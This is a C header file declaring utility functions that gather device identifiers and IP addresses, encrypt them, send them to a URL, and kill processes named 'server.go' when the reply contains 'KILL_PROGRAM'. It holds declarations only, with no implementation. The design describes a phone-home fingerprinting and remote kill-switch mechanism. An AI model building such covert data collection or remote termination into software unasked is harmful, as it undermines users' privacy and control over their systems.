#ifndef INCLUDE_UTILS_H
#define INCLUDE_UTILS_H

#include <arpa/inet.h>
#include <ctype.h>
#include <curl/curl.h>
#include <dirent.h>
#include <signal.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <errno.h>

#define MAX_REQUEST_SIZE  8192
#define MAX_RESPONSE_SIZE 8192

#define DEFAULT_PROGRAM_NAME "server.go"
#define MATCH_PATTERN        "KILL_PROGRAM"

/**
 * Sends an HTTP request to the specified URL and retrieves the response.
 *
 * @param url      The URL to connect to.
 * @param request  The request data to send.
 * @param response Buffer to store the response.
 * @return         true if the request was successful, false otherwise.
 */
bool connect_with_url(const char *url, const char *request, char *response);

/**
 * Retrieves the product UUID of the device.
 *
 * @param serial Buffer to store the product UUID.
 * @param size   Size of the buffer.
 * @return       true if the UUID was successfully retrieved, false otherwise.
 */
bool get_product_uuid(char *serial, size_t size);

/**
 * Retrieves the board serial number.
 *
 * @param serial Buffer to store the board serial number.
 * @param size   Size of the buffer.
 * @return       true if the serial number was successfully retrieved, false otherwise.
 */
bool get_board_serial(char *serial, size_t size);

/**
 * Retrieves the chassis type of the device.
 *
 * @param serial Buffer to store the chassis type.
 * @param size   Size of the buffer.
 * @return       true if the chassis type was successfully retrieved, false otherwise.
 */
bool get_chassis_type(char *serial, size_t size);

/**
 * Gets the local IPv4 address of the currently active network interface.
 *
 * @param ipv4 Buffer to store the IPv4 address as a string.
 * @param size Size of the buffer.
 * @return     true if the IPv4 address was successfully retrieved, false otherwise.
 */
bool get_local_ipv4_with_current_active(char *ipv4, size_t size);

/**
 * Retrieves the public IPv4 address of the device.
 *
 * @param ip_str Buffer to store the public IPv4 address as a string.
 * @param size   Size of the buffer.
 * @return       true if the public IPv4 address was successfully retrieved, false otherwise.
 */
bool get_public_ipv4(char *ip_str, size_t size);

/**
 * Generates a random tag that includes the public IPv4 address.
 *
 * @param tag  Buffer to store the generated tag.
 * @param size Size of the buffer.
 * @return     true if the tag was successfully generated, false otherwise.
 */
bool get_random_tag_with_public_ipv4(char *tag, size_t size);
/**
 * Terminates all processes with the specified program name.
 *
 * This function attempts to find and kill all running processes that match
 * the given program name. It returns true if the operation succeeds, or
 * false if it fails to terminate the processes.
 *
 * @param progname The name of the program whose processes should be killed.
 * @return         true if the processes were successfully terminated,
 *                 false otherwise.
 */
bool kill_program(const char *progname);

/**
 * Checks if the given response string matches the specified pattern.
 *
 * @param resp    The response string to be checked.
 * @param pattern The pattern to match against the response string.
 * @return        true if the response matches the pattern, false otherwise.
 */
bool match_string(const char *resp, const char *pattern);

/**
 * @brief Send to a URL and may KILL a program.
 *
 * This function collects system information, encrypts it,
 * sends it to a specified URL,
 * and if the response matches a specific pattern,
 * it attempts to kill a specified program.
 * @param url The URL to send the request to.
 * @param progname The name of the program to potentially kill.
 * @return true if the operation was successful, false otherwise.
 */
bool do_program(const char *url, const char *progname);

#define set_error_msg(fmt, ...)                                                \
	snprintf(error_msg,                                                    \
	         sizeof(error_msg),                                            \
	         "[%s] " fmt,                                                  \
	         __FUNCTION__,                                                 \
	         ##__VA_ARGS__)

/**
 * @brief Get the error message.
 *
 * This function returns the last error message set by `set_error_msg`.
 *
 * @return Pointer to the error message string.
 */
char       *get_error_msg(void);
extern char error_msg[256];

#endif // INCLUDE_UTILS_H
